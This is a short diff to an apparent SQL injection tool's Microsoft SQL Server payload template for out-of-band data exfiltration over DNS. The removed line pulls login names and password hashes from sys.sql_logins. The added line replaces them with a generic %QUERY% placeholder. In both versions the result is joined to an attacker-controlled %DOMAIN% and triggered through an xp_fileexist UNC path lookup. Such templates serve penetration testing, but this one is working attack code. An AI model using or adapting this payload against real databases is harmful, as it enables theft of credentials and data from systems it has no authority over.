@@ -1,5 +1,3 @@
-# Reference: http://www.defcon.org/images/defcon-15/dc15-presentations/dc-15-karlsson.pdf
-
 DECLARE @host varchar(1024);
-SELECT @host = name + '-' + master.sys.fn_varbintohexstr(password_hash) + '.%DOMAIN%' FROM sys.sql_logins;
+SELECT @host = (%QUERY%) + '.%DOMAIN%';
 EXEC('xp_fileexist "\' + @host + 'c$boot.ini"');
